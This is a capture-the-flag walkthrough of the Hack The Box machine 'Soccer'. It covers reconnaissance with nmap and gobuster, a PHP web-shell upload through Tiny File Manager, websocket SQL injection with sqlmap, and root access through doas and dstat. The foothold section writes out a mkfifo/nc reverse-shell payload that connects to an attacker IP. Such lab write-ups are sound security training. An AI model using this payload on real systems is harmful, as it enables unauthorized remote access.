---
title: "[HTB] Machine: Soccer"
description: "[HTB] Machine: Soccer"
date: 2023-06-07
menu:
  sidebar:
    name: "[HTB] Machine: Soccer"
    identifier: htb-machine-soccer
    parent: htb-machines-linux
    weight: 10
hero: images/soccer.png
tags: ["HTB", "subdomain", "vhosts", "express", "ubuntu", "tiny-file-manager", "upload", "webshell", "php", "websocket", "sqli", "websocket-sqli", "boolean-based-sqli", "sqlmap", "doas", "dstat"]
---

# Soccer
## Enumeration
- `nmap`
```
┌──(kali㉿kali)-[~]
└─$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT
Nmap scan report for www.soccer.htb (10.10.11.194)
Host is up (0.12s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 15 May 2023 15:38:17 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 15 May 2023 15:38:18 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=5/15%Time=646251FC%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Mon,\x2015\x20May\x202023\x2015:38:17\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Mon,\x2015\x20May\x202023\x2015:38:18\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\
SF:x2015\x20May\x202023\x2015:38:18\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.90 seconds
```
- `gobuster`
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/15 11:42:17 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 20713 / 26585 (77.91%)[ERROR] 2023/05/15 11:47:19 [!] parse "http://soccer.htb/error\x1f_log": net/url: invalid control character in URL
Progress: 26570 / 26585 (99.94%)
===============================================================
2023/05/15 11:48:36 Finished
===============================================================

```
- Web Server

![](./images/1.png)

## Foothold
- Let's try default credentials since we know the application running

![](./images/2.png)

![](./images/3.png)

- Let's try uploading file with `php` extension to get `rce`

![](./images/4.png)

![](./images/5.png)

- It seems like there is a cleanup job, that deletes/moves the uploaded files

![](./images/6.png)

- Thus, I tried adding `web shell` to existing files
  - But had no success, because the changes were reverted back

![](./images/7.png)

- So now we have a approximately 1 minute window to upload and get our `reverse shell` before our file gets deleted
  - Prepared payload request beforehand: `GET /tiny/uploads/shell.php?cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.37+6666+>/tmp/f`
  - Upload `php` file and send our request
  - And we get our foothold

![](./images/8.png)

![](./images/9.png)


## User
- Now let's enumerate
  - Let's use `linpeas`
  - Nothing interesting was found, except another `vhost`
  - Let's add it to our `/etc/hosts` and open it

![](./images/10.png)

- Let's check it
  - We see that there are `websockets` involved in ticket input form
  - So I played around with few basic `sqli`, but no success

![](./images/11.png)

![](./images/12.png)

- I can try using `sqlmap` but have no idea how to send requests to `websocket`
  - Luckily there is a great [blog](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) about it
  - Thanks to [rayhan0x01](https://rayhan0x01.github.io)
    - Check his blog out

![](./images/13.png)

- Now we can use `sqlmap`

![](./images/14.png)

- Use the creds dumped by `sqlmap` and we have our user

## Root
- If you ran `linpeas` before, you probably saw `doas` binary
  - If search for it's config, you will find that it has permissions for `player` to run `dstat` as root

![](./images/15.png)

![](./images/19.png)


- Check `GTFOBins`
  - And get your root

![](./images/16.png)

![](./images/17.png)

![](./images/18.png)
